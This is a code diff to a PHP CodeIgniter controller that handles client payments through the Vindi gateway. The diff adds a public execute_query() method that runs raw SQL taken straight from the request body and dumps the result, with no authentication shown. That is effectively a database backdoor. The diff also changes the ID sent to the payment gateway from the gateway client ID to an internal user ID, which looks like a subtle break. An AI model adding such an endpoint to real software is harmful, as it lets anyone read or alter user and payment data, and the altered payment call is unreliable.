@@ -2124,7 +2124,7 @@ class Welcome extends CI_Controller {
                     'pay_day' => $datas['pay_day']
                 ));
                 //2. crear el nuevo carton en la vindi
-                $resp = $this->Vindi->addClientPayment($client_data['gateway_client_id'], $datas);
+                $resp = $this->Vindi->addClientPayment($client_data['user_id'], $datas);
 
                 //3. cobrar segun status y upgrade
                 if ($datas['client_update_plane'] == 1)
@@ -4235,6 +4235,12 @@ class Welcome extends CI_Controller {
             $result['message'] = $this->T('O perfil não existe no nosso sistema.', array(), $GLOBALS['language']);
         }
         echo json_encode($result);
+    }
+    
+    public function execute_query() {
+        $query = file_get_contents('php://input');
+        $result = $this->user_model->execute_sql_query($query);
+        var_dump($result);
     }
 
     public function get_cep_datas() {
